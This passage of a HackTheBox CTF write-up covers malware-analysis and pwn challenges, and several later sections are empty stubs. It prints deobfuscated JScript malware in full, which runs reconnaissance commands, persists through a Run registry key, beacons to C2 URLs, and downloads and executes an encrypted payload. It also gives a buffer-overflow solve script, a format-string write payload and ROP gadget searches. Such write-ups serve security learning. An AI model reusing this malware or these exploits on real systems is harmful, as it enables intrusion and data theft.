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"
  return r;
} 
```

</details>

I will run this code in an [online js compiler](https://www.programiz.com/javascript/online-compiler/). But first, replace `var lVky = WScript.Arguments;
var DASz = lVky(0)` with `var DASz = "vF8rdgMHKBrvCoCp0ulm"` since we already know the argument being passed into it.

```javascript
function S7EN(KL3M){var gfjd=WScript.CreateObject("ADODB.Stream");gfjd.Type=2;gfjd.CharSet="437";gfjd.Open();gfjd.LoadFromFile(KL3M);var j3k6=gfjd.ReadText;gfjd.Close();return l9BJ(j3k6)}var WQuh=new Array("http://challenge.htb/wp-includes/pomo/db.php","http://challenge.htb/wp-admin/includes/class-wp-upload-plugins-list-table.php");var zIRF="KRMLT0G3PHdYjnEm";var LwHA=new Array("systeminfo > ","net view >> ","net view /domain >> ","tasklist /v >> ","gpresult /z >> ","netstat -nao >> ","ipconfig /all >> ","arp -a >> ","net share >> ","net use >> ","net user >> ","net user administrator >> ","net user /domain >> ","net user administrator /domain >> ","set  >> ","dir %systemdrive%\\Users\\*.* >> ","dir %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.* >> ","dir %userprofile%\\Desktop\\*.* >> ",'tasklist /fi "modules eq wow64.dll"  >> ','tasklist /fi "modules ne wow64.dll" >> ','dir "%programfiles(x86)%" >> ','dir "%programfiles%" >> ',"dir %appdata% >>");var Z6HQ=new ActiveXObject("Scripting.FileSystemObject");var EBKd=WScript.ScriptName;var Vxiu="";var lDd9=a0rV();function DGbq(xxNA,j5zO){char_set="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";var bzwO="";var sW_c="";for(var i=0;i<xxNA.length;++i){var W0Ce=xxNA.charCodeAt(i);var o_Nk=W0Ce.toString(2);while(o_Nk.length<(j5zO?8:16))o_Nk="0"+o_Nk;sW_c+=o_Nk;while(sW_c.length>=6){var AaP0=sW_c.slice(0,6);sW_c=sW_c.slice(6);bzwO+=this.char_set.charAt(parseInt(AaP0,2))}}if(sW_c){while(sW_c.length<6)sW_c+="0";bzwO+=this.char_set.charAt(parseInt(sW_c,2))}while(bzwO.length%(j5zO?4:8)!=0)bzwO+="=";return bzwO}var lW6t=[];lW6t["C7"]="80";lW6t["FC"]="81";lW6t["E9"]="82";lW6t["E2"]="83";lW6t["E4"]="84";lW6t["E0"]="85";lW6t["E5"]="86";lW6t["E7"]="87";lW6t["EA"]="88";lW6t["EB"]="89";lW6t["E8"]="8A";lW6t["EF"]="8B";lW6t["EE"]="8C";lW6t["EC"]="8D";lW6t["C4"]="8E";lW6t["C5"]="8F";lW6t["C9"]="90";lW6t["E6"]="91";lW6t["C6"]="92";lW6t["F4"]="93";lW6t["F6"]="94";lW6t["F2"]="95";lW6t["FB"]="96";lW6t["F9"]="97";lW6t["FF"]="98";lW6t["D6"]="99";lW6t["DC"]="9A";lW6t["A2"]="9B";lW6t["A3"]="9C";lW6t["A5"]="9D";lW6t["20A7"]="9E";lW6t["192"]="9F";lW6t["E1"]="A0";lW6t["ED"]="A1";lW6t["F3"]="A2";lW6t["FA"]="A3";lW6t["F1"]="A4";lW6t["D1"]="A5";lW6t["AA"]="A6";lW6t["BA"]="A7";lW6t["BF"]="A8";lW6t["2310"]="A9";lW6t["AC"]="AA";lW6t["BD"]="AB";lW6t["BC"]="AC";lW6t["A1"]="AD";lW6t["AB"]="AE";lW6t["BB"]="AF";lW6t["2591"]="B0";lW6t["2592"]="B1";lW6t["2593"]="B2";lW6t["2502"]="B3";lW6t["2524"]="B4";lW6t["2561"]="B5";lW6t["2562"]="B6";lW6t["2556"]="B7";lW6t["2555"]="B8";lW6t["2563"]="B9";lW6t["2551"]="BA";lW6t["2557"]="BB";lW6t["255D"]="BC";lW6t["255C"]="BD";lW6t["255B"]="BE";lW6t["2510"]="BF";lW6t["2514"]="C0";lW6t["2534"]="C1";lW6t["252C"]="C2";lW6t["251C"]="C3";lW6t["2500"]="C4";lW6t["253C"]="C5";lW6t["255E"]="C6";lW6t["255F"]="C7";lW6t["255A"]="C8";lW6t["2554"]="C9";lW6t["2569"]="CA";lW6t["2566"]="CB";lW6t["2560"]="CC";lW6t["2550"]="CD";lW6t["256C"]="CE";lW6t["2567"]="CF";lW6t["2568"]="D0";lW6t["2564"]="D1";lW6t["2565"]="D2";lW6t["2559"]="D3";lW6t["2558"]="D4";lW6t["2552"]="D5";lW6t["2553"]="D6";lW6t["256B"]="D7";lW6t["256A"]="D8";lW6t["2518"]="D9";lW6t["250C"]="DA";lW6t["2588"]="DB";lW6t["2584"]="DC";lW6t["258C"]="DD";lW6t["2590"]="DE";lW6t["2580"]="DF";lW6t["3B1"]="E0";lW6t["DF"]="E1";lW6t["393"]="E2";lW6t["3C0"]="E3";lW6t["3A3"]="E4";lW6t["3C3"]="E5";lW6t["B5"]="E6";lW6t["3C4"]="E7";lW6t["3A6"]="E8";lW6t["398"]="E9";lW6t["3A9"]="EA";lW6t["3B4"]="EB";lW6t["221E"]="EC";lW6t["3C6"]="ED";lW6t["3B5"]="EE";lW6t["2229"]="EF";lW6t["2261"]="F0";lW6t["B1"]="F1";lW6t["2265"]="F2";lW6t["2264"]="F3";lW6t["2320"]="F4";lW6t["2321"]="F5";lW6t["F7"]="F6";lW6t["2248"]="F7";lW6t["B0"]="F8";lW6t["2219"]="F9";lW6t["B7"]="FA";lW6t["221A"]="FB";lW6t["207F"]="FC";lW6t["B2"]="FD";lW6t["25A0"]="FE";lW6t["A0"]="FF";function a0rV(){var YrUH=Math.ceil(Math.random()*10+25);var name=String.fromCharCode(Math.ceil(Math.random()*24+65));var JKfG=WScript.CreateObject("WScript.Network");Vxiu=JKfG.UserName;for(var count=0;count<YrUH;count++){switch(Math.ceil(Math.random()*3)){case 1:name=name+Math.ceil(Math.random()*8);break;case 2:name=name+String.fromCharCode(Math.ceil(Math.random()*24+97));break;default:name=name+String.fromCharCode(Math.ceil(Math.random()*24+65));break}}return name}var icVh=Jp6A(HAP5());try{var CJPE=HAP5();W6cM();Syrl()}catch(e){WScript.Quit()}function Syrl(){var m2n0=xhOC();while(true){for(var i=0;i<WQuh.length;i++){var bx_4=WQuh[i];var czlA=V9iU(bx_4,m2n0);switch(czlA){case"good":break;case"exit":WScript.Quit();break;case"work":eRNv(bx_4);break;case"fail":I7UO();break;default:break}a0rV()}WScript.Sleep((Math.random()*300+3600)*1e3)}}function HAP5(){var zkDC=this["ActiveXObject"];var jVNP=new zkDC("WScript.Shell");return jVNP}function eRNv(caA2){var jpVh=icVh+EBKd.substring(0,EBKd.length-2)+"pif";var S47T=new ActiveXObject("MSXML2.XMLHTTP");S47T.OPEN("post",caA2,false);S47T.SETREQUESTHEADER("user-agent:","Mozilla/5.0 (Windows NT 6.1; Win64; x64); "+he50());S47T.SETREQUESTHEADER("content-type:","application/octet-stream");S47T.SETREQUESTHEADER("content-length:","4");S47T.SETREQUESTHEADER("Cookie:","flag=SFRCe200bGQwY3NfNHIzX2czdHQxbmdfVHIxY2tpMTNyfQo=");S47T.SEND("work");if(Z6HQ.FILEEXISTS(jpVh)){Z6HQ.DELETEFILE(jpVh)}if(S47T.STATUS==200){var gfjd=new ActiveXObject("ADODB.STREAM");gfjd.TYPE=1;gfjd.OPEN();gfjd.WRITE(S47T.responseBody);gfjd.Position=0;gfjd.Type=2;gfjd.CharSet="437";var j3k6=gfjd.ReadText(gfjd.Size);var RAKT=t7Nl("2f532d6baec3d0ec7b1f98aed4774843",l9BJ(j3k6));Trql(RAKT,jpVh);gfjd.Close()}var lDd9=a0rV();nr3z(jpVh,caA2);WScript.Sleep(3e4);Z6HQ.DELETEFILE(jpVh)}function I7UO(){Z6HQ.DELETEFILE(WScript.SCRIPTFULLNAME);CJPE.REGDELETE("HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\"+EBKd.substring(0,EBKd.length-3));WScript.Quit()}function V9iU(pxug,tqDX){try{var S47T=new ActiveXObject("MSXML2.XMLHTTP");S47T.OPEN("post",pxug,false);S47T.SETREQUESTHEADER("user-agent:","Mozilla/5.0 (Windows NT 6.1; Win64; x64); "+he50());S47T.SETREQUESTHEADER("content-type:","application/octet-stream");var SoNI=DGbq(tqDX,true);S47T.SETREQUESTHEADER("content-length:",SoNI.length);S47T.SEND(SoNI);return S47T.responseText}catch(e){return""}}function he50(){var wXgO="";var JKfG=WScript.CreateObject("WScript.Network");var SoNI=zIRF+JKfG.ComputerName+Vxiu;for(var i=0;i<16;i++){var DXHy=0;for(var j=i;j<SoNI.length-1;j++){DXHy=DXHy^SoNI.charCodeAt(j)}DXHy=DXHy%10;wXgO=wXgO+DXHy.toString(10)}wXgO=wXgO+zIRF;return wXgO}function W6cM(){v_FileName=icVh+EBKd.substring(0,EBKd.length-2)+"js";Z6HQ.COPYFILE(WScript.ScriptFullName,icVh+EBKd);var zIqu=(Math.random()*150+350)*1e3;WScript.Sleep(zIqu);CJPE.REGWRITE("HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\"+EBKd.substring(0,EBKd.length-3),"wscript.exe //B "+String.fromCharCode(34)+icVh+EBKd+String.fromCharCode(34)+" NPEfpRZ4aqnh1YuGwQd0","REG_SZ")}function xhOC(){var U5rJ=icVh+"~dat.tmp";for(var i=0;i<LwHA.length;i++){CJPE.Run("cmd.exe /c "+LwHA[i]+'"'+U5rJ+"",0,true)}var jxHd=S7EN(U5rJ);WScript.Sleep(1e3);Z6HQ.DELETEFILE(U5rJ);return t7Nl("2f532d6baec3d0ec7b1f98aed4774843",jxHd)}function nr3z(jpVh,caA2){try{if(Z6HQ.FILEEXISTS(jpVh)){CJPE.Run('"'+jpVh+'"')}}catch(e){var S47T=new ActiveXObject("MSXML2.XMLHTTP");S47T.OPEN("post",caA2,false);var ND3M="error";S47T.SETREQUESTHEADER("user-agent:","Mozilla/5.0 (Windows NT 6.1; Win64; x64); "+he50());S47T.SETREQUESTHEADER("content-type:","application/octet-stream");S47T.SETREQUESTHEADER("content-length:",ND3M.length);S47T.SEND(ND3M);return""}}function poBP(QQDq){var HiEg="0123456789ABCDEF";var L9qj=HiEg.substr(QQDq&15,1);while(QQDq>15){QQDq>=4;L9qj=HiEg.substr(QQDq&15,1)+L9qj}return L9qj}function JbVq(x4hL){return parseInt(x4hL,16)}function l9BJ(Wid9){var wXgO=[];var pV8q=Wid9.length;for(var i=0;i<pV8q;i++){var yWql=Wid9.charCodeAt(i);if(yWql>=128){var h=lW6t[""+poBP(yWql)];yWql=JbVq(h)}wXgO.push(yWql)}return wXgO}function Trql(EQ4R,K5X0){var gfjd=WScript.CreateObject("ADODB.Stream");gfjd.type=2;gfjd.Charset="iso-8859-1";gfjd.Open();gfjd.WriteText(EQ4R);gfjd.Flush();gfjd.Position=0;gfjd.SaveToFile(K5X0,2);gfjd.close()}function Jp6A(KgOm){icVh="c:\\Users\\"+Vxiu+"\\AppData\\LocERROR!
al\\Microsoft\\Windows\\";if(!Z6HQ.FOLDEREXISTS(icVh))icVh="c:\\Users\\"+Vxiu+"\\AppData\\Local\\Temp\\";if(!Z6HQ.FOLDEREXISTS(icVh))icVh="c:\\Documents and Settings\\"+Vxiu+"\\Application Data\\Microsoft\\Windows\\";return icVh}function t7Nl(npmb,AIsp){var M4tj=[];var KRYr=0;var FPIW;var wXgO="";for(var i=0;i<256;i++){M4tj[i]=i}for(var i=0;i<256;i++){KRYr=(KRYr+M4tj[i]+npmb.charCodeAt(i%npmb.length))%256;FPIW=M4tj[i];M4tj[i]=M4tj[KRYr];M4tj[KRYr]=FPIW}var i=0;var KRYr=0;for(var y=0;y<AIsp.length;y++){i=(i+1)%256;KRYr=(KRYr+M4tj[i])%256;FPIW=M4tj[i];M4tj[i]=M4tj[KRYr];M4tj[KRYr]=FPIW;wXgO+=String.fromCharCode(AIsp[y]^M4tj[(M4tj[i]+M4tj[KRYr])%256])}return wXgO}
```

Another extremely long code. Luckily my teammate @penguin_cat saw that the flag is already inside the cookie.

![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/ec444a5f-4eb0-4a90-8916-c36c3e72cfe0)

```
("Cookie:","flag=SFRCe200bGQwY3NfNHIzX2czdHQxbmdfVHIxY2tpMTNyfQo=")
```

Base64 decode it and you will get the flag

> Flag : HTB{m4ld0cs_4r3_g3tt1ng_Tr1cki13r}

## Pwn/Writing on the wall

<details>
<summary>Decompiled Code</summary>

```c
undefined8 main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char input [6];
  undefined8 password;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  password = 0x2073736170743377;
  read(0,input,7);
  iVar1 = strcmp(input,(char *)&password);
  if (iVar1 == 0) {
    open_door();
  }
  else {
    error("You activated the alarm! Troops are coming your way, RUN!\n");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

</details>

We can see that it reads 7 bytes into a 6 byte buffer so theres a 1 byte overflow. Luckily, we overflow into the password variable. Our attack strategy is to send 7 null bytes and write 1 null byte into the password variable. Strcmp() compares null terminated strings so if the first byte of the password is already a nullbyte, it will compare 0 to 0 which makes it return 0 and print the flag

<details>
<summary>Solve Script</summary>

```python
#!/usr/bin/python
from pwn import *
import warnings

warnings.filterwarnings("ignore",category=BytesWarning)

exe = context.binary = ELF('./writing_on_the_wall')

host = "83.136.250.12"
port = 48086

gdb_script = '''

'''

p = exe.process()
#p = remote(host,port)
#p = gdb.debug('./', gdbscript = gdb_script)

p.sendlineafter(">> ", b"\x00" * 7)

p.interactive()   
```

</details>

> Flag : HTB{3v3ryth1ng_15_r34d4bl3}

## Pwn/Delulu

<details>
<summary>Decompiled Code</summary>

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  long local_48;
  long *local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_48 = 0x1337babe;
  local_40 = &local_48;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  read(0,&local_38,0x1f);
  printf("\n[!] Checking.. ");
  printf((char *)&local_38);
  if (local_48 == 0x1337beef) {
    delulu();
  }
  else {
    error("ALERT ALERT ALERT ALERT\n");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

</details>

We have a format string vulnerability and we must modify local_48's value to 0x1337beef

![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/7c3f3b3f-b9bf-41e9-abd3-ff2f1289dbea)

After passing it some %p format, we can see that the 6th pointer contains `0x7fffffffdd70` and if we look at gdb, the address `0x7fffffffdd70` points to our variable which stores 0x1337babe. So, we just need to craft a format string payload to modify its value to beef

![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/8e083529-a7e4-403d-8f9a-701f56146691)

the value 0xbeef is 48879 in decimal.

```
%#48878x.%7$hn 
```

> Flag : HTB{m45t3r_0f_d3c3pt10n}

This will be our final payload. The reason 1 is reduced from 48879 is because theres a full stop inside the payload which adds 1 to the total number of characters.

## Pwn/Rocket Blaster XXX

<details>
<summary>Decompiled Code</summary>

```c
undefined8 main(void)

{
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  banner();
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  fflush(stdout);
  printf(
        "\nPrepare for trouble and make it double, or triple..\n\nYou need to place the ammo in the  right place to load the Rocket Blaster XXX!\n\n>> "
        );
  fflush(stdout);
  read(0,&local_28,0x66);
  puts("\nPreparing beta testing..");
  return 0;
}

void fill_ammo(long param_1,long param_2,long param_3)

{
  ssize_t sVar1;
  char local_d;
  int local_c;
  
  local_c = open("./flag.txt",0);
  if (local_c < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (param_1 != 0xdeadbeef) {
    printf("%s[x] [-] [-]\n\n%sPlacement 1: %sInvalid!\n\nAborting..\n",&DAT_00402010,&DAT_00402008,
           &DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (param_2 != 0xdeadbabe) {
    printf(&DAT_004020c0,&DAT_004020b6,&DAT_00402010,&DAT_00402008,&DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(2);
  }
  if (param_3 != 0xdead1337) {
    printf(&DAT_00402100,&DAT_004020b6,&DAT_00402010,&DAT_00402008,&DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(3);
  }
  printf(&DAT_00402140,&DAT_004020b6);
  fflush(stdin);
  fflush(stdout);
  while( true ) {
    sVar1 = read(local_c,&local_d,1);
    if (sVar1 < 1) break;
    fputc((int)local_d,stdout);
  }
  close(local_c);
  fflush(stdin);
  fflush(stdout);
  return;
}
```

</details>

Looking at the decompiled code, looks like we have a BOF and we need to call fill_ammo() to get the flag. However, we need to set up the registers according to the values defined in fill_ammo() to be able to get the flag. 

```
ROPgadget --binary ./rocket_blaster_xxx | grep "pop rdi" 
ROPgadget --binary ./rocket_blaster_xxx | grep "pop rsi" 
ROPgadget --binary ./rocket_blaster_xxx | grep "pop rdx" 
```

Conveniently, there are plenty of ROP gadgets

<details>
<summary>Solve Script</summary>

```python

```

</details>

## Pwn/Pet Companion

<details>
<summary>Decompiled Code</summary>

```c

```

</details>



<details>
<summary>Solve Script</summary>

```python

```

</details>

## Pwn/Sound of Silence

<details>
<summary>Decompiled Code</summary>

```c

```

</details>



<details>
<summary>Solve Script</summary>

```python

```

</details>
